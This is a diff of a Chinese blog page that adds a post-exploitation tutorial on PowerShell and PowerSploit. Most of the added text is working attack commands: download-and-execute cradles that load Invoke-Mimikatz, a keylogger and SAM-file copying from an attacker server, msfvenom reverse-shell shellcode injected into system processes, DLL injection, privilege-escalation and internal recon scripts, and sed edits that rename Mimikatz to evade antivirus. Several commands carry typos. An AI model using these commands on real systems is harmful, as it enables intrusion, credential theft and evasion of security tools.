@@ -283,7 +283,17 @@
       <p>网络安全(一)PowerShell</p>
 <h2 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h2><h3 id="PowerShell-1"><a href="#PowerShell-1" class="headerlink" title="PowerShell"></a>PowerShell</h3><p>Windows PowerShell 是一种命令行外壳程序和脚本环境，让命令行用户和脚本编写者可以利用 .NET Framework 的强大功能。</p>
 <p>它引入了许多非常有用的新概念，进一步扩展了Windows命令提示符和Windows Script Host环境中获得的知识和创建的脚本。 </p>
-<p>Windows PowerShell v3 将伴随着 Microsoft Hyper-V 3.0 和 Windows Server 2012 发布。PowerShell v3 是一个 Windows 任务自动化的框架，它由一个命 令行 shell 和内置在这个.NET 框架上的编程语言组成。 PowerShell v3 采用新的 cmdlet 让管理员能够更深入到系统进程中，这些进程可以制作成可执行的文件或脚本（script）。cmdlet 是一条轻量命令， Windows PowerShell 运行时间在自动化脚本的环境里调用它。 Cmdlet 包括显示当前目录的 Get-Location，访问文件内容的 Get-Content 和结束运行进程的 Stop-Process。 PowerShell v3 在 Windows Server 8 中装载了 Windows Management Framework 3.0。PowerShell 运行环境也能嵌入到其它应用中</p>
+<p>Windows PowerShell v3 将伴随着 Microsoft Hyper-V 3.0 和 Windows Server 2012 发布。PowerShell v3 是一个 Windows 任务自动化的框架，它由一个命 令行 shell 和内置在这个.NET 框架上的编程语言组成。 PowerShell v3 采用新的 cmdlet 让管理员能够更深入到系统进程中，这些进程可以制作成可执行的文件或脚本（script）。cmdlet 是一条轻量命令， Windows PowerShell 运行时间在自动化脚本的环境里调用它。 Cmdlet 包括显示当前目录的 Get-Location，访问文件内容的 Get-Content 和结束运行进程的 Stop-Process。 PowerShell v3 在 Windows Server 8 中装载了 Windows Management Framework 3.0。PowerShell 运行环境也能嵌入到其它应用中。</p>
+<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ol>
+<li>在Windows 7以上的操作系统中是默认安装的。</li>
+<li>PowerShell脚本可以运行在内存中，不需要写入磁盘。</li>
+<li>几乎不会触发杀毒软件。</li>
+<li>可以远程执行。</li>
+<li>目前很多工具都是基于PowerShell开发的。</li>
+<li>使得Windows的脚本攻击变得更加容易。</li>
+<li>cmd.exe通常会被阻止运行，但是PowerShell不会。</li>
+<li>可以用来管理活动目录。</li>
+</ol>
 <h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>下载地址  <a href="https://github.com/PowerShell/PowerShell/releases">https://github.com/PowerShell/PowerShell/releases</a></p>
 <h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>net user  查看本地用户列表<br>net accounts  查看本地密码策略<br>net localgroup  查看当前计算机中所有组<br>net localgroup administrators  查看管理员组的信息(哪些用户为管理员)<br>net statistics workstation  查看主机开机时间和开机后的网络状态<br>net session  列出本地计算机连接的客户端对话信息<br>net start  查看本地端口</p>
 <p>net share  查看本机共享列表和可访问的域共享列表<br>net use 本地盘符 \目标 IP 地址\目标共享名: 这里目标共享名可以通过对 目标执行<br>共享文件夹挂载到本地 net use i: \192.168.1.230\www<br>net share 查看,这条命令可以将目标盘符挂载到我们本地</p>
@@ -300,6 +310,107 @@
 <p>arp  显示和修改地址解析协议(ARP)使用的“IP 到物理”地址转换表<br>arp /a  查看地址解析协议缓存(找到内网中其他和目标主机通讯过的主机)</p>
 <p>reg query  查看注册表相关信息</p>
 <p>reg query “HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings” /v ProxyServer  查看代理信息(全局代理时使用此命令查看)</p>
+<h3 id="执行策略"><a href="#执行策略" class="headerlink" title="执行策略"></a>执行策略</h3><p>查看powershell的默认策略：  Get-ExecutionPolicy</p>
+<p>Unrestricted 权限最高，可以不受限制执行任意脚本<br>Restricted 默认策略，不允许任意脚本的执行<br>AllSigned 所有脚本必须经过签名运行<br>RemoteSigned 本地脚本无限制，但是对来自网络的脚本必须经过签名<br>Bypass 没有任何限制和提示<br>Undefined 没有设置脚本的策略</p>
+<p>Set-ExecutionPolicy Unrestricted 可能会被防护软件发现</p>
+<h2 id="PowerSploit"><a href="#PowerSploit" class="headerlink" title="PowerSploit"></a>PowerSploit</h2><p>PowerSploit是PowerShell脚本的集合，集成了很多渗透测试能用到的脚本，是针对win系统进行后渗透的利器。</p>
+<p><a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a></p>
+<p>使用方法就是将脚本文件放在web服务器上，通过PowerShell的远程加载实现文件不落地执行</p>
+<h3 id="Exfiltration"><a href="#Exfiltration" class="headerlink" title="Exfiltration"></a>Exfiltration</h3><ol>
+<li>Invoke-mimikatz 猕猴桃获取hash神器，通过powershell调用mimikatz</li>
+</ol>
+<p>iex(New-Object net.webclient).Downloadstring(‘<a target="_blank" rel="noopener" href="http://192.168.10.1/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1&#39;">http://192.168.10.1/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1&#39;</a>)</p>
+<p>然后使用mimikatz获取hash即可（管理员权限）</p>
+<p>Invole-mimikatz -command sekurlsa::logonpassword #会被win10阻拦<br>Invole-mimikatz -command lsadump::asm           #从sam文件中获取</p>
+<ol start="2">
+<li>Get-Keystrokes 键盘记录器 ，记录按键、时间和活动窗口 ，主要是窃取账户密码用</li>
+</ol>
+<p>iex(New-Object net.webclient).Downloadstring(‘<a target="_blank" rel="noopener" href="http://192.168.10.1/PowerSploit/Exfiltration/Get-Keystrokes.ps1&#39;">http://192.168.10.1/PowerSploit/Exfiltration/Get-Keystrokes.ps1&#39;</a>)<br>Get-Keystrokes -LogPath C:\123.txt</p>
+<ol start="3">
+<li>Invoke-NinjaCopy 复制一些系统无法复制的文件，如sam文件(管理员权限)</li>
+</ol>
+<p>iex(New-Object net.webclient).Downloadstring(‘<a target="_blank" rel="noopener" href="http://192.168.10.1/PowerSploit/Exfiltration/Invoke-NinjaCopy.ps1&#39;">http://192.168.10.1/PowerSploit/Exfiltration/Invoke-NinjaCopy.ps1&#39;</a>)<br>Invoke-NinjaCopy -Path c:\windows\system\config\sam -LocalDestination C:\windows\temp\sam</p>
+<p>Get-TimedScreenshot 截屏并保存在指定文件夹下</p>
+<p>Get-TimedScreenshot -Path c:\windows\temp\ -Interval 10 -EndTime 12:00</p>
+<h3 id="CodeExecution"><a href="#CodeExecution" class="headerlink" title="CodeExecution"></a>CodeExecution</h3><p>这个模块就是用来执行各种代码的，注入shellcode，注入dll等等</p>
+<p>Invoke-Shellcode</p>
+<ol>
+<li>常用的是调用Invoke-Shellcode模块将shellcode注入到本地powershell当中执行。<br>首先生成shellcode，CS和msf的都可以</li>
+</ol>
+<p>msfvenom -p windows/x64/meterpreter/reverse_http Lhost=192.168.10.1 LPort=8000  -f powershell</p>
+<p>powershell接收的shellcode格式是0x00</p>
+<p>[Byte[]] $buf = 0xfc,0x48,0x83……</p>
+<p>然后用模块加载shellcode，-Force参数会默认执行载荷</p>
+<p>IEX(New-Object net.webclient).Downloadstring(‘<a target="_blank" rel="noopener" href="http://192.168.10.1/PowerSploit/CodeExecution/Invoke-Shellcode.ps1&#39;">http://192.168.10.1/PowerSploit/CodeExecution/Invoke-Shellcode.ps1&#39;</a>)<br>get-help Invoke-Shellcode<br>Invoke-ShellCode -Force -Shellcode 0xfc,0x84….</p>
+<p>或者将shellcode放在服务器上</p>
+<p>IEX(New-Object net.webclient).Downloadstring(“<a target="_blank" rel="noopener" href="http://192.168.10.1/123.txt&quot;">http://192.168.10.1/123.txt&quot;</a>)<br>Invole-ShellCode -Force -Shellcode $buf</p>
+<p>都可以与msf建立连接，但是ps窗口关闭，连接就会断</p>
+<ol start="2">
+<li>调用Invoke-Shellcode模块将shellcode注入到进程当中</li>
+</ol>
+<p>因为进程关闭，连接也会停止，所以最好注入到系统进程中去</p>
+<p>首先查看注入的进程 ，记录PID值</p>
+<p>taklist<br>ps -Name lsm</p>
+<p>注入到该进程,不成功就尝试别的进程</p>
+<p>Invole-ShellCode -Shellcode -Force $buf -ProcessID 496</p>
+<p>可以开启一个隐藏进程进行注入</p>
+<p>start-process C:\windows\system32\notepad.exe -WindowStyle Hidden<br>Get-Process Notepad</p>
+<h3 id="Invoke-Dllinjection"><a href="#Invoke-Dllinjection" class="headerlink" title="Invoke-Dllinjection"></a>Invoke-Dllinjection</h3><p>顾名思义注入dll，但这个就需要将dll文件上传到目标机了，文件落地比较危险。</p>
+<p>先加载该模块</p>
+<p>IEX(New-Object net.webclient).Downloadstring(‘<a target="_blank" rel="noopener" href="http://192.168.10.1/ps/Exfiltration/Invoke-Mimikatz.ps1&#39;">http://192.168.10.1/ps/Exfiltration/Invoke-Mimikatz.ps1&#39;</a>)</p>
+<p>将dll文件上传主机后，进行注入到程序</p>
+<p>Invoke-DllInjection -Dll ./test.dll -ProcessId 8787</p>
+<h3 id="Privesc模块"><a href="#Privesc模块" class="headerlink" title="Privesc模块"></a>Privesc模块</h3><p>提权模块，常用的就是使用Get-System提升管理员权限</p>
+<p>PowerUP 用来寻找目标主机windows服务漏洞进行提权的使用脚本</p>
+<p>IEX(New-Object net.webclient).Downloadstring(‘<a target="_blank" rel="noopener" href="http://192.168.10.1/PowerSploit/Privesc/PowerUp.ps1&#39;">http://192.168.10.1/PowerSploit/Privesc/PowerUp.ps1&#39;</a>)</p>
+<ol>
+<li>Invoke-AllChecks 自动执行PowerUp下所有的脚本来检查目标主机 </li>
+<li>Find-PathDllHijack 检查当前%PATH%的哪些目录是用户可以写入的</li>
+<li>Get-ApplicationHost 利用系统上的application.config文件恢复加密过的应用池和虚拟目录的密码</li>
+<li>Get-RegistryAlwaysInstallElevated 检测AlwaysInstallElevated注册表是否被设置,如果被设置,意味着MSI文件是以SYSTEM权限运行的</li>
+<li>Get-RegistryAutoLogon 检测windows注册表的AutoAdminLogon项有没有被设置,可查询被设置默认的用户名密码</li>
+<li>Get-ServiceDetail –ServiceName DHCP 返回某服务的信息</li>
+<li>Get-ServiceFilePermission 检测当前用户能够在哪些服务的目录写入相关的可执行文件(可以通过这些文件提权)</li>
+<li>Test-ServiceDaclPermission 检测所有可用的服务,并尝试对这些打开的服务进行修改(若可修改,返回服务对象)</li>
+<li>Get-UnattendedInstallFile 检查以下路径,查找是否存在这些文件(文件中可能包含部署凭据)</li>
+<li>Get-ServiceUnquoted 用于检查服务路径,返回包含空格但不带引号的服务路径</li>
+<li>Get-ModifiableRegistryAutoRun 检查开机自启动的应用程序路径和注册表键值,返回当前用户可修改的程序路径</li>
+<li>Get-ModifiableScheduledTaskFile 返回当前用户能够修改的计划任务程序的名称和路径</li>
+<li>Get-Webconfig 返回当前服务器上web.config文件中的数据库连接字符串的明文</li>
+</ol>
+<h3 id="Reacon模块"><a href="#Reacon模块" class="headerlink" title="Reacon模块"></a>Reacon模块</h3><p>这个模块就是用来扫内网的，通过该主机为跳板机探测内网主机、端口服务等</p>
+<ol>
+<li>Invoke_Portscan 就是用来扫描内网端口</li>
+</ol>
+<p>一样的步骤，先调用模块</p>
+<p>IEX(New-Object net.webclient).Downloadstring(‘<a target="_blank" rel="noopener" href="http://192.168.10.1/PowerSploit/Recon/Invoke-Portscan.ps1&#39;">http://192.168.10.1/PowerSploit/Recon/Invoke-Portscan.ps1&#39;</a>)</p>
+<p>然后利用Invoke-Portscan扫就行了</p>
+<p>Invoke-Portscan -Host 192.168.10.6 -ports “1-1000”</p>
+<p>Invoke-ReverseDnsLookup 反向DNS查询，扫描内网主机的ip对应的主机名</p>
+<p>在内网或域内，每个IP都对应一个主机名</p>
+<p>Invoke-ReverseDnsLookup 192.168.10.0/24</p>
+<ol start="2">
+<li>Get-HttpStatus 扫描内网站点的web目录，需要一个字典</li>
+</ol>
+<p>Get-HttpStatus -Target 192.168.10.6 -Path C:\dict.txt</p>
+<ol start="3">
+<li>Get-ComputerDetails 获得登录信息</li>
+</ol>
+<h3 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h3><p>powershell命令是可以在cmd直接运行的</p>
+<p>powershell -com iex(New-Object net.webclient).Downloadstring(‘<a target="_blank" rel="noopener" href="http://192.168.10.1/123.txt&#39;">http://192.168.10.1/123.txt&#39;</a>)</p>
+<p>如果调用模块必须进入powershell命令行</p>
+<p>powershell</p>
+<h3 id="免杀思路"><a href="#免杀思路" class="headerlink" title="免杀思路"></a>免杀思路</h3><ol>
+<li><p>Invoke-Mimikatz.ps1改为psyyds.ps1</p>
+</li>
+<li><p>删除一些空格和注释</p>
+</li>
+</ol>
+<p>sed -i -e ‘/&lt;#&gt;/c\‘ Invoke-Mimikatz.ps1<br>sed -i -e ‘s/^[[:space:]]<em>#.</em>$//g’ Invoke-Mimikatz.ps1</p>
+<ol start="3">
+<li>更改函数名</li>
+</ol>
+<p>sed -i -e ‘s/Invoke-Mimikatz/Invoke-miansha/g’ Invoke-Mimikatz.ps1<br>sed -i -e ‘s/DumpCreds/DumpCredd/g’ Invoke-Mimikatz.ps1</p>
 
     </div>
   </div>
@@ -409,7 +520,7 @@
     
       <div class="nav-next">
         下一篇:
-        <a href="/2021/51LIUNX-GDB%E8%B0%83%E8%AF%95/" target="_self">LIUNX-GDB调试</a>
+        <a href="/2021/50CobaltStrike44/" target="_self">50CobaltStrike44</a>
         <i class="iconfont icon-next"></i>
       </div>
     
